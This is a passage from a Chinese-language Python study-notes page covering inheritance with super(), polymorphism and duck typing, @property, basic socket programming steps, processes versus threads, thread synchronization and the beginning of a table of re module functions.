data-num=\"6\"></td><td><pre><span class=\"token comment\">##### 测试输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr></table></figure><p>发现鲨鱼可以移动了。</p>\n<p>这里需要注意的是这个 self 并不是父类 Fish 的实例对象，而是子类 Shark 的实例对象，所以这里说的未绑定是指不需要绑定父类的实例对象，使用子类的实例对象代替即可。</p>\n<p>这是小甲鱼的书上的介绍。</p>\n<p>个人理解是：在 Shark 类的__init__函数里调用了父类的__init__函数，并把父类的__init__函数里的要赋值属性赋值给了子类的 self。也就是普通的调用函数一样，传入了个参数是 self。</p>\n<h4 id=\"super函数\"><a class=\"anchor\" href=\"#super函数\">#</a> super 函数</h4>\n<p>如果觉得调用未绑定的父类方法难以理解，Python 中还有一个更好的方法可以取代它。那就是使用 super 函数</p>\n<p>上面的代码可以这样改：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#### 测试输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>可以移动。</p>\n<p>super 函数的 &quot;超级&quot; 之处在于既不需要明确给出任何基类的名字，它会自动帮您找出所有基类以及对应的方法。</p>\n<p>由于你不用给出基类的名字，这就意味着如果需要改变类继承关系，只要改变 calss 语句里的父类即可，而不必邀在大量的代码中去修改被继承的方法。</p>\n<p>还有多重继承、组合、以及一种很流行的编程模式：Minxin 等。</p>\n<h3 id=\"多态\"><a class=\"anchor\" href=\"#多态\">#</a> 多态</h3>\n<p>转载自：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY5NTk2OS9hcnRpY2xlL2RldGFpbHMvOTIxNzU4NDA=\">https://blog.csdn.net/weixin_44695969/article/details/92175840</span></p>\n<p>Python 中多态的作用<br />\n让具有不同功能的函数可以使用相同的函数名，这样就可以用一个函数名调用不同内容 (功能) 的函数。</p>\n<p>Python 中多态的特点<br />\n 1、只关心对象的实例方法是否同名，不关心对象所属的类型；<br />\n2、对象所属的类之间，继承关系可有可无；<br />\n3、多态的好处可以增加代码的外部调用灵活度，让代码更加通用，兼容性比较强；<br />\n4、多态是调用方法的技巧，不会影响到类的内部设计。</p>\n<p>多态的应用场景</p>\n<ol>\n<li>对象所属的类之间没有继承关系<br />\n调用同一个函数 fly (), 传入不同的参数（对象），可以达成不同的功能</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Duck</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                  <span class=\"token comment\"># 鸭子类</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"鸭子沿着地面飞起来了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Swan</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                  <span class=\"token comment\"># 天鹅类</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"天鹅在空中翱翔\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Plane</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                 <span class=\"token comment\"># 飞机类</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"飞机隆隆地起飞了\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fly</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>                                        <span class=\"token comment\"># 实现飞的功能函数</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>fly<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>duck <span class=\"token operator\">=</span> Duck<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>fly<span class=\"token punctuation\">(</span>duck<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>swan <span class=\"token operator\">=</span> Swan<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>fly<span class=\"token punctuation\">(</span>swan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>plane <span class=\"token operator\">=</span> Plane<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>fly<span class=\"token punctuation\">(</span>plane<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">=</span>运行结果：<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>鸭子沿着地面飞起来了</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>天鹅在空中翱翔</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>飞机隆隆地起飞了</pre></td></tr></table></figure><ol start=\"2\">\n<li>对象所属的类之间有继承关系（应用更广）</li>\n</ol>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">gradapa</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>money<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>money <span class=\"token operator\">=</span> money</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is gradapa\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> </pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">father</span><span class=\"token punctuation\">(</span>gradapa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span>money<span class=\"token punctuation\">,</span>job<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>money<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        self<span class=\"token punctuation\">.</span>job <span class=\"token operator\">=</span> job</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is father,我重写了父类的方法\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">mother</span><span class=\"token punctuation\">(</span>gradapa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> money<span class=\"token punctuation\">,</span> job<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token builtin\">super</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>money<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        self<span class=\"token punctuation\">.</span>job <span class=\"token operator\">=</span> job</pre></td></tr><tr><td data-num=\"18\"></td><td><pre> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">p</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>         <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"this is mother,我重写了父类的方法\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>         <span class=\"token keyword\">return</span> <span class=\"token number\">100</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>         </pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token comment\">#定义一个函数，函数调用类中的 p () 方法</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">fc</span><span class=\"token punctuation\">(</span>obj<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    obj<span class=\"token punctuation\">.</span>p<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>gradapa1 <span class=\"token operator\">=</span> gradapa<span class=\"token punctuation\">(</span><span class=\"token number\">3000</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>father1 <span class=\"token operator\">=</span> father<span class=\"token punctuation\">(</span><span class=\"token number\">2000</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"工人\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>mother1 <span class=\"token operator\">=</span> mother<span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"老师\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>fc<span class=\"token punctuation\">(</span>gradapa1<span class=\"token punctuation\">)</span>            <span class=\"token comment\">#这里的多态性体现是向同一个函数，传递不同参数后，可以实现不同功能.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>fc<span class=\"token punctuation\">(</span>father1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fc<span class=\"token punctuation\">(</span>mother1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">==</span><span class=\"token operator\">=</span>运行结果：<span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">==</span><span class=\"token operator\">=</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>this <span class=\"token keyword\">is</span> gradapa</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>this <span class=\"token keyword\">is</span> father<span class=\"token punctuation\">,</span>我重写了父类的方法</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>this <span class=\"token keyword\">is</span> mother<span class=\"token punctuation\">,</span>我重写了父类的方法</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token number\">100</span></pre></td></tr></table></figure><p>def fly (obj):                                        # 实现飞的功能函数<br />\n obj.fly ()<br />\n 由于 Python 的动态语言特性，传递给函数 fly () 的参数 obj 可以是 任何的类型，只要它有一个 fiy () 的方法即可。动态语言调用实例方法时不检查类型，只要方法存在，参数正确，就可以调用。这就是动态语言的 “鸭子类型”，它并不要求严格的继承体系，一个对象只要 “看起来像鸭子，走起路来像鸭子”，那它就可以被看做是鸭子。</p>\n<p>可能有人会觉得，这些内容很自然啊，没什么不好理解，不觉得多态有什么特殊，Python 就是这样啊！</p>\n<p>如果你学过 JAVA 这一类强类型静态语言，就不会这么觉得了，对于 JAVA，必须指定函数参数的数据类型，只能传递对应参数类型或其子类型的参数，不能传递其它类型的参数。</p>\n<p>拓展：<br />\nJava 中多态性的表现： 多态性，可以理解为一个事物的多种形态。同样 python 中也支持多态，但是是有限的的支持多态性，主要是因为 python 中变量的使用不用声明，所以不存在父类引用指向子类对象的多态体现，同时 python 不支持重载。在 python 中 多态的使用不如 Java 中那么明显，所以 python 中刻意谈到多态的意义不是特别大。</p>\n<h2 id=\"property装饰器\"><a class=\"anchor\" href=\"#property装饰器\">#</a> @property 装饰器</h2>\n<p>Python 内置的 @property 装饰器可以把类的方法伪装成属性调用的方式。也就是本来是 Foo.func () 的调用方法，变成 Foo.func 的方式。在很多场合下，这是一种非常有用的机制。</p>\n<p>详解请参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzQ2\">https://www.liujiangblog.com/course/python/46</span></p>\n<h1 id=\"python网络编程\"><a class=\"anchor\" href=\"#python网络编程\">#</a> Python 网络编程</h1>\n<p>python socket 通信逻辑如下图所示：</p>\n<p><img data-src=\"image004.png\" alt=\"\" /></p>\n<p>这张逻辑图，是整个 socket 编程中的重点的重点，你必须将它理解、吃透，然后刻在脑海里，真正成为自己记忆的一部分。</p>\n<p>socket 编程思路：<br />\n服务端：</p>\n<p>创建套接字，绑定套接字到本地 IP 与端口：socket.socket (socket.AF_INET,socket.SOCK_STREAM) , s.bind ()<br />\n 开始监听连接：s.listen ()<br />\n 进入循环，不断接受客户端的连接请求：s.accept ()<br />\n 接收传来的数据，或者发送数据给对方：s.recv () , s.sendall ()<br />\n 传输完毕后，关闭套接字：s.close ()</p>\n<p>客户端:</p>\n<p>创建套接字，连接服务器地址：socket.socket (socket.AF_INET,socket.SOCK_STREAM) , s.connect ()<br />\n 连接后发送数据和接收数据：s.sendall (), s.recv ()<br />\n 传输完毕后，关闭套接字：s.close ()</p>\n<p>创建 TCP Socket：\ts=socket.socket (socket.AF_INET,socket.SOCK_STREAM)<br />\n 创建 UDP Socket：\ts=socket.socket (socket.AF_INET,socket.SOCK_DGRAM)</p>\n<p>注意<br />\n Python3 以后，socket 传递的都是 bytes 类型的数据，字符串需要先转换一下，string.encode () 即可；另一端接收到的 bytes 数据想转换成字符串，只要 bytes.decode () 一下就可以。</p>\n<h1 id=\"python进程与线程\"><a class=\"anchor\" href=\"#python进程与线程\">#</a> Python 进程与线程</h1>\n<p>最近没时间，有时间了深究一下。记下的内容仅仅能过考试就行</p>\n<p>找到一篇概念讲的的很好的博客：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2Z1bmN0aW9uX18vYXJ0aWNsZS9kZXRhaWxzLzgwODgzMDg0\">https://blog.csdn.net/function__/article/details/80883084</span></p>\n<p>详细讲解多线程的用法：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzc5\">https://www.liujiangblog.com/course/python/79</span></p>\n<h2 id=\"什么是进程什么是线程\"><a class=\"anchor\" href=\"#什么是进程什么是线程\">#</a> 什么是进程，什么是线程</h2>\n<p>进程是程序（软件，应用）的一个执行实例，每个运行中的程序，可以同时创建多个进程，但至少要有一个。每个进程都提供执行程序所需的所有资源，都有一个虚拟的地址空间、可执行的代码、操作系统的接口、安全的上下文（记录启动该进程的用户和权限等等）、唯一的进程 ID、环境变量、优先级类、最小和最大的工作空间（内存空间）。进程可以包含线程，并且每个进程必须有至少一个线程。每个进程启动时都会最先产生一个线程，即主线程，然后主线程会再创建其他的子线程。</p>\n<p>线程，有时被称为轻量级进程 (Lightweight Process，LWP），是程序执行流的最小单元。一个标准的线程由线程 ID，当前指令指针 (PC），寄存器集合和堆栈组成。另外，线程是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不独立拥有系统资源，但它可与同属一个进程的其它线程共享该进程所拥有的全部资源。每一个应用程序都至少有一个进程和一个线程。在单个程序中同时运行多个线程完成不同的被划分成一块一块的工作，称为多线程。<br />\n<img data-src=\"image002.gif\" alt=\"\" /></p>\n<p>一个应用程序通常作为具有多个控制线程的一个进程来实现</p>\n<h2 id=\"线程与进程的区别\"><a class=\"anchor\" href=\"#线程与进程的区别\">#</a> 线程与进程的区别</h2>\n<p>进程与线程区别：</p>\n<ul>\n<li>同一个进程中的线程共享同一内存空间，但进程之间的内存空间是独立的。</li>\n<li>同一个进程中的所有线程的数据是共享的，但进程之间的数据是独立的。</li>\n<li>对主线程的修改可能会影响其他线程的行为，但是父进程的修改（除了删除以外）不会影响其他子进程。</li>\n<li>线程是一个上下文的执行指令，而进程则是与运算相关的一簇资源。</li>\n<li>同一个进程的线程之间可以直接通信，但是进程之间的交流需要借助中间代理来实现。</li>\n<li>创建新的线程很容易，但是创建新的进程需要对父进程做一次复制。</li>\n<li>一个线程可以操作同一进程的其他线程，但是进程只能操作其子进程。</li>\n<li>线程启动速度快，进程启动速度慢（但是两者运行速度没有可比性）。</li>\n</ul>\n<p>由于现代 cpu 已经进入多核时代，并且主频也相对以往大幅提升，多线程和多进程编程已经成为主流。Python 全面支持多线程和多进程编程，同时还支持协程。</p>\n<h2 id=\"线程的优点\"><a class=\"anchor\" href=\"#线程的优点\">#</a> 线程的优点</h2>\n<p>多线程编程具有如下四大类的优点：</p>\n<ul>\n<li>\n<p>响应性：如果一个交互程序采用多线程，那么即使部分阻塞或者执行冗长操作，它仍可以继续执行，从而增加对用户的响应程度。这对于用户界面设计尤其有用。例如，当用户点击一个按钮以便执行一个耗时操作时，想一想会发生什么事。一个单线程应用程序对用户反应会迟钝，直到该操作完成。与之相反，如果耗时操作在一个单独线程内执行，那么应用程序仍可响应用户。</p>\n</li>\n<li>\n<p>资源共享：进程只能通过如共享内存和消息传递之类的技术共享资源。这些技术应由程序员显式地安排。不过，线程默认共享它们所属进程的内存和资源。代码和数据共享的优点是：它允许一个应用程序在同一地址空间内有多个不同活动线程。</p>\n</li>\n<li>\n<p>经济：进程创建所需的内存和资源分配非常昂贵。由于线程能够共享它们所属进程的资源，所以创建和切换线程更加经济。虽然进程创建和管理与线程创建和管理的开销差异的实际测量较为困难，但是前者通常要比后者花费更多时间。例如，对于 Solaris，进程创建要比线程创建慢 30 倍，而且进程切换要比线程切换慢 5 倍。</p>\n</li>\n<li>\n<p>可伸缩性：对于多处理器体系结构，多线程的优点更大，因为线程可在多处理核上并行运行。不管有多少可用 CPU，单线程进程只能运行在一个 CPU 上。</p>\n</li>\n</ul>\n<h2 id=\"线程的缺点\"><a class=\"anchor\" href=\"#线程的缺点\">#</a> 线程的缺点</h2>\n<ul>\n<li>线程也是程序，所以线程需要占用内存，线程越多占用内存也越多；</li>\n<li>多线程需要协调和管理，所以需要 CPU 时间跟踪线程；</li>\n<li>线程之间对共享资源的访问会相互影响，必须解决竞用共享资源的问题；</li>\n<li>线程太多会导致控制太复杂，最终可能造成很多 Bug；</li>\n</ul>\n<h2 id=\"线程同步\"><a class=\"anchor\" href=\"#线程同步\">#</a> 线程同步</h2>\n<p>多个线程共享同一个资源就会存在线程安全问题， 当 两个或两个以上的线程需要共享资源，它们需要某种方法来确定资源在某一刻仅被一个线程占用。达到此目的的过程叫做同步（synchronization），这时候，我们需要引入线程 “同步” 机制，即各位线程之间要有个先来后到，不能一窝蜂挤上去抢作一团。 线程同步的真实意思和字面意思恰好相反。 线程同步的真实意思，其实是 “排队”：几个线程之间要排队，一个一个对共享资源进行操作，而不是同时进行操作。<br />\nPython threading 模块提供了 Lock/RLock、Condition、queue、Event 等对象来实现线程同步。</p>\n<p>详细讲解：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xlc291ci9hcnRpY2xlL2RldGFpbHMvODg4MDgxMzk=\">https://blog.csdn.net/Lesour/article/details/88808139</span></p>\n<h1 id=\"python正则表达式\"><a class=\"anchor\" href=\"#python正则表达式\">#</a> Python 正则表达式</h1>\n<p>详解见：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzc0\">https://www.liujiangblog.com/course/python/74</span></p>\n<p>在 Python 中，通过内置的 re 模块提供对正则表达式的支持。正则表达式会被编译成一系列的字节码，然后由通过 C 编写的正则表达式引擎进行执行。该引擎自从 Python1.6 被内置以来，近 20 年时间未有发生过变化.</p>\n<h2 id=\"re函数\"><a class=\"anchor\" href=\"#re函数\">#</a> re 函数</h2>\n<p>提供了下面的方法进行字符串的查找、替换和分割等各种处理操作。</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:right\">方法</th>\n<th style=\"text-align:right\">描述</th>\n<th style=\"text-align:right\">返回值</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:right\">compile(pattern[, flags])</td>\n<td style=\"text-align:right\">根据包含正则表达式的字符串创建模式对象</td>\n<td style=\"text-align:right\">re 对象</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">search(pattern, string[, flags])</td>\n<td style=\"text-align:right\">在字符串中查找</td>\n<td style=\"text-align:right\">第一个匹配到的对象或者 None</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">match(pattern, string[, flags])</td>\n<td style=\"text-align:right\">在字符串的开始处匹配模式</td>\n<td style=\"text-align:right\">在字符串开头匹配到的对象或者 None</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">split(pattern, string[, maxsplit=0,flags])</td>\n<td style=\"text-align:right\">根据模式的匹配项来分割字符串</td>\n<td style=\"text-align:right\">分割后的字符串列表</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">findall(pattern, string,flags)</td>\n<td style=\"text-align:right\">列出字符串中模式的所有匹配项</td>\n<td style=\"text-align:right\">所有匹配到的字符串列表</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">sub(pat,repl, string[,count=0,flags])</td>\n<td style=\"text-align:right\">将字符串中所有的 pat 的匹配项用 repl 替换</td>\n<td style=\"text-align:right\">完成替换后的新字符串</td>\n</tr>\n<tr>\n<td style=\"text-align:right\">finditer(pattern, string,flags)</td>\n<td 